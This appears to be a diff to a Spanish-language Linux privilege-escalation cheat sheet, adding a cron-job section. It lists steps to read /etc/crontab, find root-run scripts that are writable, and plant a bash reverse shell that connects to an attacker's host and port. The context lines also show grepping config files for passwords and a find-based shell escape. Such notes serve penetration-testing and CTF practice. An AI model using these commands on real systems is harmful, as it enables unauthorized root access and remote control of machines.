@@ -816,7 +816,14 @@ find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/n
 	find . -exec /bin/sh \; -quit
 
 
-# CRON JOBS #
+# CRON JOBS # Ver las tareas programadas mal configuradas
+	cat /etc/crontab
+# Comprobar los programas lanzados por root y ver si tenemos permisos de escritura en alguno
+	ls -lah   ---   comprobar quien es el propietario
+# Si hay permisos editar. Buscar una reverse shell
+# https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
+	nano programa.sh
+	bash -i >& /dev/tcp/[RHOST]/[PORT] 0>&1
 
 
 # CAPABILITIES #
